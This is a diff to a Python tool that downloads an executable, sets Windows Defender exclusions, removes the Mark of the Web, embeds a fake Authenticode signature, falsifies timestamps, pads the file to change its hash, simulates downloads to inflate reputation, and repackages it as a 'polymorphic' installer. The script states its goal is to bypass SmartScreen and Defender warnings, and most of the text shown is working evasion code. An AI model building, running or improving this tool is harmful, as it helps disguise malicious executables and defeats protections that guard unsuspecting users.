@@ -12,9 +12,11 @@ from urllib.parse import urlparse
 from pathlib import Path
 from colorama import init, Fore, Style
 import pefile  # For icon extraction
-import win32gui  # For fallback icon extraction
+import win32gui  # For icon extraction
+import win32api  # For LoadLibraryEx
 import win32ui
 import win32con
+from tqdm import tqdm  # For progress bar
 
 # Initialize colorama for colored console output
 init()
@@ -50,7 +52,7 @@ def set_defender_exclusions():
                 ["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{path}'"],
                 check=True, capture_output=True, text=True
             )
-        print(Fore.GREEN + "[+] Windows Defender exclusions set for script directories." + Style.RESET_ALL)
+        print(Fore.GREEN + "[+] Windows Defender exclusions set successfully." + Style.RESET_ALL)
     except subprocess.CalledProcessError as e:
         print(Fore.RED + f"[+] Warning: Failed to set Defender exclusions: {e.stderr}" + Style.RESET_ALL)
         print(Fore.RED + "[+] Please disable real-time protection or set exclusions manually in Windows Security." + Style.RESET_ALL)
@@ -74,7 +76,7 @@ def create_dummy_file(temp_dir):
     with open(dummy_path, "w") as f:
         f.write(f"Dummy file generated on {time.ctime()} for installer variation.")
     set_file_permissions(dummy_path)
-    print(Fore.GREEN + f"[+] Dummy file created at {dummy_path}" + Style.RESET_ALL)
+    print(Fore.GREEN + "[+] Dummy file created successfully." + Style.RESET_ALL)
     return dummy_path
 
 def calculate_file_hash(file_path, algorithm="sha256"):
@@ -108,7 +110,7 @@ def sanitize_filename(url):
 
 def extract_icon_pefile(exe_path, temp_dir):
     """Extract icon using pefile."""
-    print(Fore.GREEN + f"[+] Attempting to extract icon from {exe_path} using pefile..." + Style.RESET_ALL)
+    print(Fore.GREEN + "[+] Attempting to extract icon using pefile..." + Style.RESET_ALL)
     try:
         pe = pefile.PE(exe_path)
         rt_icon_list = [entry.id for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries if entry.id == pefile.RESOURCE_TYPE['RT_GROUP_ICON']]
@@ -128,26 +130,24 @@ def extract_icon_pefile(exe_path, temp_dir):
             f.write(icon_data)
         set_file_permissions(icon_path)
         if not check_file_access(icon_path):
-            print(Fore.RED + f"[+] Error: Cannot access extracted icon: {icon_path}" + Style.RESET_ALL)
+            print(Fore.RED + f"[+] Error: Cannot access extracted icon {icon_path}" + Style.RESET_ALL)
             return None
-        print(Fore.GREEN + f"[+] Icon extracted to {icon_path}" + Style.RESET_ALL)
+        print(Fore.GREEN + "[+] Icon extracted successfully." + Style.RESET_ALL)
         return icon_path
     except Exception as e:
         print(Fore.RED + f"[+] Warning: Failed to extract icon with pefile: {e}" + Style.RESET_ALL)
         return None
 
 def extract_icon_win32gui(exe_path, temp_dir):
-    """Extract icon using win32gui as a fallback."""
-    print(Fore.GREEN + f"[+] Attempting to extract icon from {exe_path} using win32gui..." + Style.RESET_ALL)
+    """Extract icon using win32gui and win32api as a fallback."""
+    print(Fore.GREEN + "[+] Attempting to extract icon using win32gui..." + Style.RESET_ALL)
     try:
-        # Load the EXE and get the large icon
-        hinst = win32gui.LoadLibraryEx(exe_path, 0, win32con.LOAD_LIBRARY_AS_DATAFILE)
+        hinst = win32api.LoadLibraryEx(exe_path, 0, win32con.LOAD_LIBRARY_AS_DATAFILE)
         hicon = win32gui.LoadIcon(hinst, 0)  # 0 is typically the first icon
         if not hicon:
             print(Fore.RED + "[+] Warning: No icon found in EXE using win32gui." + Style.RESET_ALL)
-            win32gui.FreeLibrary(hinst)
+            win32api.FreeLibrary(hinst)
             return None
-        # Convert icon to ICO file
         icon_path = os.path.join(temp_dir, f"extracted_icon_{generate_random_string()}.ico")
         hdc = win32ui.CreateDCFromHandle(win32gui.GetDC(0))
         ico_x = win32gui.GetSystemMetrics(win32con.SM_CXICON)
@@ -159,41 +159,72 @@ def extract_icon_win32gui(exe_path, temp_dir):
         win32gui.DrawIconEx(hdc.GetHandleOutput(), 0, 0, hicon, ico_x, ico_y, 0, 0, win32con.DI_NORMAL)
         dib = hbm.GetBitmapBits(True)
         with open(icon_path, 'wb') as f:
-            # Write ICO header
             f.write(struct.pack('<3H', 0, 1, 1))  # ICONDIR: Reserved, Type, Count
             f.write(struct.pack('<4B2H2I', ico_x, ico_y, 0, 0, 1, 32, len(dib), 22))  # ICONDIRENTRY
             f.write(dib)  # Bitmap data
         win32gui.DestroyIcon(hicon)
-        win32gui.FreeLibrary(hinst)
+        win32api.FreeLibrary(hinst)
         set_file_permissions(icon_path)
         if not check_file_access(icon_path):
-            print(Fore.RED + f"[+] Error: Cannot access extracted icon: {icon_path}" + Style.RESET_ALL)
+            print(Fore.RED + f"[+] Error: Cannot access extracted icon {icon_path}" + Style.RESET_ALL)
             return None
-        print(Fore.GREEN + f"[+] Icon extracted to {icon_path}" + Style.RESET_ALL)
+        print(Fore.GREEN + "[+] Icon extracted successfully." + Style.RESET_ALL)
         return icon_path
     except Exception as e:
         print(Fore.RED + f"[+] Warning: Failed to extract icon with win32gui: {e}" + Style.RESET_ALL)
         return None
 
+def extract_default_windows_icon(temp_dir):
+    """Extract the default Windows EXE icon from shell32.dll."""
+    print(Fore.GREEN + "[+] Extracting default Windows EXE icon from shell32.dll..." + Style.RESET_ALL)
+    try:
+        shell32_path = os.path.join(os.environ['SystemRoot'], 'System32', 'shell32.dll')
+        hinst = win32api.LoadLibraryEx(shell32_path, 0, win32con.LOAD_LIBRARY_AS_DATAFILE)
+        hicon = win32gui.LoadIcon(hinst, 0)  # Icon index 0 is the default EXE icon
+        if not hicon:
+            print(Fore.RED + "[+] Warning: Failed to load default icon from shell32.dll." + Style.RESET_ALL)
+            win32api.FreeLibrary(hinst)
+            return None
+        icon_path = os.path.join(temp_dir, f"default_icon_{generate_random_string()}.ico")
+        hdc = win32ui.CreateDCFromHandle(win32gui.GetDC(0))
+        ico_x = win32gui.GetSystemMetrics(win32con.SM_CXICON)
+        ico_y = win32gui.GetSystemMetrics(win32con.SM_CYICON)
+        hbm = win32ui.CreateBitmap()
+        hbm.CreateCompatibleBitmap(hdc, ico_x, ico_y)
+        hdc = hdc.CreateCompatibleDC()
+        hdc.SelectObject(hbm)
+        win32gui.DrawIconEx(hdc.GetHandleOutput(), 0, 0, hicon, ico_x, ico_y, 0, 0, win32con.DI_NORMAL)
+        dib = hbm.GetBitmapBits(True)
+        with open(icon_path, 'wb') as f:
+            f.write(struct.pack('<3H', 0, 1, 1))  # ICONDIR: Reserved, Type, Count
+            f.write(struct.pack('<4B2H2I', ico_x, ico_y, 0, 0, 1, 32, len(dib), 22))  # ICONDIRENTRY
+            f.write(dib)  # Bitmap data
+        win32gui.DestroyIcon(hicon)
+        win32api.FreeLibrary(hinst)
+        set_file_permissions(icon_path)
+        if not check_file_access(icon_path):
+            print(Fore.RED + f"[+] Error: Cannot access default icon {icon_path}" + Style.RESET_ALL)
+            return None
+        print(Fore.GREEN + "[+] Default Windows EXE icon extracted successfully." + Style.RESET_ALL)
+        return icon_path
+    except Exception as e:
+        print(Fore.RED + f"[+] Warning: Failed to extract default icon from shell32.dll: {e}" + Style.RESET_ALL)
+        return None
+
 def extract_icon(exe_path, temp_dir):
-    """Extract the icon from the EXE, trying pefile first, then win32gui."""
+    """Extract the icon from the EXE, falling back to default Windows EXE icon."""
     icon_path = extract_icon_pefile(exe_path, temp_dir)
     if icon_path:
         return icon_path
     icon_path = extract_icon_win32gui(exe_path, temp_dir)
     if icon_path:
         return icon_path
-    print(Fore.GREEN + "[+] Continuing without custom icon." + Style.RESET_ALL)
-    manual_icon = input(Fore.GREEN + "[+] Icon extraction failed. Enter path to a .ico file (or press Enter to skip): " + Style.RESET_ALL)
-    if manual_icon and os.path.exists(manual_icon) and manual_icon.lower().endswith('.ico'):
-        print(Fore.GREEN + f"[+] Using manually specified icon: {manual_icon}" + Style.RESET_ALL)
-        return manual_icon
-    print(Fore.GREEN + "[+] No valid icon provided. Using default PyInstaller icon." + Style.RESET_ALL)
-    return None
+    print(Fore.GREEN + "[+] Icon extraction failed. Using default Windows EXE icon." + Style.RESET_ALL)
+    return extract_default_windows_icon(temp_dir)
 
 def embed_fake_signature(file_path, temp_dir):
     """Embed a fake Authenticode signature structure into the EXE."""
-    print(Fore.GREEN + f"[+] Embedding fake Authenticode signature into {file_path}..." + Style.RESET_ALL)
+    print(Fore.GREEN + "[+] Embedding fake Authenticode signature..." + Style.RESET_ALL)
     try:
         if not os.path.exists(temp_dir):
             os.makedirs(temp_dir, exist_ok=True)
@@ -229,7 +260,7 @@ def embed_fake_signature(file_path, temp_dir):
             print(Fore.RED + "[+] Warning: EXE hashes match after embedding fake signature." + Style.RESET_ALL)
             print(Fore.GREEN + "[+] Using original EXE as a precaution." + Style.RESET_ALL)
             return file_path
-        print(Fore.GREEN + f"[+] Fake Authenticode signature embedded at {signed_path}" + Style.RESET_ALL)
+        print(Fore.GREEN + "[+] Fake Authenticode signature embedded successfully." + Style.RESET_ALL)
         return signed_path
     except Exception as e:
         print(Fore.RED + f"[+] Error embedding fake signature: {e}" + Style.RESET_ALL)
@@ -238,11 +269,11 @@ def embed_fake_signature(file_path, temp_dir):
 
 def modify_timestamp(file_path):
     """Modify the file's creation and modification timestamps."""
-    print(Fore.GREEN + f"[+] Modifying timestamp for {file_path}..." + Style.RESET_ALL)
+    print(Fore.GREEN + "[+] Modifying timestamp..." + Style.RESET_ALL)
     try:
         fake_time = time.mktime(time.strptime("2023-01-01 12:00:00", "%Y-%m-%d %H:%M:%S"))
         os.utime(file_path, (fake_time, fake_time))
-        print(Fore.GREEN + f"[+] Timestamp modified for {file_path}" + Style.RESET_ALL)
+        print(Fore.GREEN + "[+] Timestamp modified successfully." + Style.RESET_ALL)
         return file_path
     except Exception as e:
         print(Fore.RED + f"[+] Warning: Failed to modify timestamp: {e}" + Style.RESET_ALL)
@@ -251,7 +282,7 @@ def modify_timestamp(file_path):
 
 def pad_file(file_path, temp_dir):
     """Append random bytes to the file to alter its hash."""
-    print(Fore.GREEN + f"[+] Padding {file_path} with random bytes..." + Style.RESET_ALL)
+    print(Fore.GREEN + "[+] Padding EXE with random bytes..." + Style.RESET_ALL)
     try:
         padded_path = os.path.join(temp_dir, f"padded_{generate_random_string()}.exe")
         shutil.copyfile(file_path, padded_path)
@@ -268,7 +299,7 @@ def pad_file(file_path, temp_dir):
             print(Fore.RED + "[+] Warning: EXE hashes match after padding." + Style.RESET_ALL)
             print(Fore.GREEN + "[+] Using original EXE as a precaution." + Style.RESET_ALL)
             return file_path
-        print(Fore.GREEN + f"[+] Padded EXE saved at {padded_path}" + Style.RESET_ALL)
+        print(Fore.GREEN + "[+] EXE padded successfully." + Style.RESET_ALL)
         return padded_path
     except Exception as e:
         print(Fore.RED + f"[+] Error padding file: {e}" + Style.RESET_ALL)
@@ -276,32 +307,40 @@ def pad_file(file_path, temp_dir):
         return file_path
 
 def download_exe(url, temp_dir):
-    """Download the EXE file to temp_dir and return its path."""
+    """Download the EXE file to temp_dir with a progress bar and return its path."""
     if not os.path.exists(temp_dir):
         os.makedirs(temp_dir, exist_ok=True)
         set_file_permissions(temp_dir)
     original_filename = sanitize_filename(url)
     output_path = os.path.join(temp_dir, f"original_{generate_random_string()}.exe")
-    print(Fore.GREEN + f"[+] Downloading EXE from {url}..." + Style.RESET_ALL)
+    print(Fore.GREEN + "[+] Downloading EXE..." + Style.RESET_ALL)
     response = requests.get(url, stream=True)
     if response.status_code == 200:
-        with open(output_path, 'wb') as f:
+        total_size = int(response.headers.get('content-length', 0))
+        with open(output_path, 'wb') as f, tqdm(
+            desc="Download Progress",
+            total=total_size,
+            unit='B',
+            unit_scale=True,
+            unit_divisor=1024,
+        ) as pbar:
             for chunk in response.iter_content(chunk_size=8192):
                 f.write(chunk)
+                pbar.update(len(chunk))
         with open(output_path, 'rb') as f:
             if f.read(2) != b'MZ':
                 raise ValueError(f"Downloaded file {output_path} is not a valid EXE")
         set_file_permissions(output_path)
         if not check_file_access(output_path):
             raise Exception(f"Cannot access downloaded EXE: {output_path}")
-        print(Fore.GREEN + f"[+] EXE downloaded to {output_path}" + Style.RESET_ALL)
+        print(Fore.GREEN + "[+] EXE downloaded successfully." + Style.RESET_ALL)
         return output_path, original_filename
     else:
         raise Exception(f"Failed to download EXE. Status code: {response.status_code}")
 
 def remove_motw(file_path):
     """Remove the Mark of the Web using PowerShell."""
-    print(Fore.GREEN + f"[+] Removing Mark of the Web from {file_path}..." + Style.RESET_ALL)
+    print(Fore.GREEN + "[+] Removing Mark of the Web..." + Style.RESET_ALL)
     try:
         streams = subprocess.run(
             ["powershell", "-Command", f"Get-Item -Path '{file_path}' -Stream *"],
@@ -312,7 +351,7 @@ def remove_motw(file_path):
                 ["powershell", "-Command", f"Unblock-File -Path '{file_path}'"],
                 check=True
             )
-            print(Fore.GREEN + "[+] Mark of the Web removed." + Style.RESET_ALL)
+            print(Fore.GREEN + "[+] Mark of the Web removed successfully." + Style.RESET_ALL)
         else:
             print(Fore.GREEN + "[+] No Mark of the Web found." + Style.RESET_ALL)
     except subprocess.CalledProcessError as e:
@@ -322,7 +361,7 @@ def remove_motw(file_path):
 
 def simulate_downloads(file_path, temp_dir, count=100):
     """Simulate multiple downloads to build reputation with retries for file deletion."""
-    print(Fore.GREEN + f"[+] Simulating {count} downloads for {file_path} to build reputation..." + Style.RESET_ALL)
+    print(Fore.GREEN + f"[+] Simulating {count} downloads to build reputation..." + Style.RESET_ALL)
     for i in range(count):
         temp_path = os.path.join(temp_dir, f"temp_{generate_random_string()}.exe")
         try:
@@ -353,7 +392,7 @@ def simulate_downloads(file_path, temp_dir, count=100):
 
 def create_exe_wrapper(exe_path, output_dir, original_filename, temp_dir, icon_path=None):
     """Create a polymorphic EXE wrapper using pyinstaller."""
-    print(Fore.GREEN + f"[+] Creating polymorphic EXE wrapper for {exe_path}..." + Style.RESET_ALL)
+    print(Fore.GREEN + "[+] Creating polymorphic EXE wrapper..." + Style.RESET_ALL)
     wrapper_exe_path = os.path.join(output_dir, f"setup_{generate_random_string()}.exe")
     temp_script_path = os.path.join(temp_dir, f"installer_{generate_random_string()}.py")
     dummy_file = create_dummy_file(temp_dir)
@@ -412,7 +451,7 @@ if __name__ == "__main__":
         if result.stderr:
             print(Fore.RED + f"[+] PyInstaller stderr: {result.stderr}" + Style.RESET_ALL)
         dist_contents = os.listdir(dist_dir) if os.path.exists(dist_dir) else []
-        print(Fore.GREEN + f"[+] Contents of dist directory ({dist_dir}): {dist_contents}" + Style.RESET_ALL)
+        print(Fore.GREEN + f"[+] Contents of dist directory: {dist_contents}" + Style.RESET_ALL)
         generated_exe = os.path.join(dist_dir, product_name + ".exe")
         if not os.path.exists(generated_exe):
             raise Exception(f"Generated EXE not found at {generated_exe}")
@@ -422,7 +461,7 @@ if __name__ == "__main__":
             print(Fore.RED + f"[+] Error: Cannot access wrapped EXE: {wrapper_exe_path}" + Style.RESET_ALL)
             print(Fore.GREEN + "[+] Using original EXE without wrapping." + Style.RESET_ALL)
             return exe_path
-        print(Fore.GREEN + f"[+] Polymorphic EXE wrapper created at {wrapper_exe_path}" + Style.RESET_ALL)
+        print(Fore.GREEN + "[+] Polymorphic EXE wrapper created successfully." + Style.RESET_ALL)
         return wrapper_exe_path
     except subprocess.CalledProcessError as e:
         print(Fore.RED + f"[+] Error creating EXE wrapper: {e.stderr} (Exit code: {e.returncode})" + Style.RESET_ALL)
@@ -451,9 +490,9 @@ def safe_move_file(src, dst, retries=3, delay=1.0):
         try:
             if os.path.exists(dst):
                 os.remove(dst)
-                print(Fore.GREEN + f"[+] Removed existing file: {dst}" + Style.RESET_ALL)
+                print(Fore.GREEN + "[+] Removed existing output EXE." + Style.RESET_ALL)
             shutil.move(src, dst)
-            print(Fore.GREEN + f"[+] Moved {src} to {dst}" + Style.RESET_ALL)
+            print(Fore.GREEN + "[+] Moved wrapper EXE to final output." + Style.RESET_ALL)
             return True
         except (OSError, FileExistsError, PermissionError) as e:
             print(Fore.RED + f"[+] Warning: Failed to move {src} to {dst} (attempt {attempt+1}/{retries}): {e}" + Style.RESET_ALL)
@@ -470,7 +509,7 @@ def main():
         if not os.path.exists(temp_dir):
             os.makedirs(temp_dir, exist_ok=True)
             set_file_permissions(temp_dir)
-        print(Fore.GREEN + f"[+] Temporary directory created at {temp_dir}" + Style.RESET_ALL)
+        print(Fore.GREEN + "[+] Temporary directory created successfully." + Style.RESET_ALL)
         exe_path, original_filename = download_exe(EXE_URL, temp_dir)
         icon_path = extract_icon(exe_path, temp_dir)
         remove_motw(exe_path)
@@ -483,11 +522,9 @@ def main():
         if not safe_move_file(final_exe_path, final_output_path):
             print(Fore.RED + f"[+] Error: Final EXE not saved as {final_output_path}. Check {final_exe_path} instead." + Style.RESET_ALL)
         else:
-            print(Fore.GREEN + f"[+] Final output EXE saved as {final_output_path}" + Style.RESET_ALL)
+            print(Fore.GREEN + f"[+] Final output EXE saved at {final_output_path}" + Style.RESET_ALL)
         shutil.rmtree(temp_dir, ignore_errors=True)
-        print(Fore.GREEN + "[+] Temporary files cleaned up." + Style.RESET_ALL)
         print(Fore.GREEN + "[+] Process complete. The output EXE should bypass SmartScreen and Defender warnings." + Style.RESET_ALL)
-        print(Fore.GREEN + "[+] Note: Polymorphic repackaging, fake signature, timestamp modification, and padding may take time to build SmartScreen reputation." + Style.RESET_ALL)
     except Exception as e:
         print(Fore.RED + f"[+] Error in main process: {e}" + Style.RESET_ALL)
         raise
